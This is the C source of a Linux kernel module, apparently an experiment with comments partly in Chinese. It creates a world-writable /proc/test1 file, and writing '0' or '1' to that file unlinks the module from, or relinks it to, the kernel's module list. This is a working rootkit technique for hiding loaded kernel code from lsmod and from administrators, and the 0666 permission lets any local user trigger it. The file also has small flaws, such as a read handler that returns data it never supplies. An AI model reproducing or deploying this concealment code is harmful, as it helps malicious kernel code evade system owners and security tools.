#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/ftrace.h>

#include <linux/proc_fs.h>

#include <linux/mutex.h>

static struct list_head *mod_pre;

void hide(void) {
    while (!mutex_trylock(&module_mutex))
        cpu_relax();
    mod_pre = THIS_MODULE->list.prev;
    list_del(mod_pre->next);
    mutex_unlock(&module_mutex);
}

void show(void) {
    while (!mutex_trylock(&module_mutex))
        cpu_relax();
    list_add(&THIS_MODULE->list, mod_pre);
    mutex_unlock(&module_mutex);
}

// Optional
static int open_proc(struct inode *inode, struct file *file) {
    printk(KERN_INFO "proc file opend.....\t");
    return 0;
}

static int release_proc(struct inode *inode, struct file *file) {
    printk(KERN_INFO "proc file released.....\n");
    return 0;
}

static char command[2];

/*
** This function will be called when we read the procfs file
*/
static ssize_t read_proc(struct file *filp, char __user *buffer, size_t length, loff_t *offset) {
    pr_info("proc file read.....\n");

    return length;;
}

/*
** This function will be called when we write the procfs file
*/
static ssize_t write_proc(struct file *filp, const char *buff, size_t len, loff_t *off) {
    pr_info("proc file wrote.....\n");

    // buff 是 user mod 地址，需要拷贝到内核中
    // 不然会造成 exc_page_fault 错误
//    int t = access_ok(buff, 2);
//    t = copy_from_user(command, buff, 2);
    if (!access_ok(buff, 2) || copy_from_user(command, buff, 2))
        return len;
    switch (command[0]) {
        case '0':
            hide();
            break;
        case '1':
            show();
            break;
        default:
            break;
    }

    return len;
}

static struct proc_ops proc_fops = {
        .proc_open = open_proc,
        .proc_read = read_proc,
        .proc_write = write_proc,
        .proc_release = release_proc
};


static int __init hello_init(void) {
    pr_info("hello!\n");

    proc_create("test1", 0666, NULL, &proc_fops);

    return 0;
}

static void __exit hello_exit(void) {
    pr_info("hello_exit!\n");
    remove_proc_entry("test1", NULL);
}

module_init(hello_init);
module_exit(hello_exit);
MODULE_LICENSE("GPL");
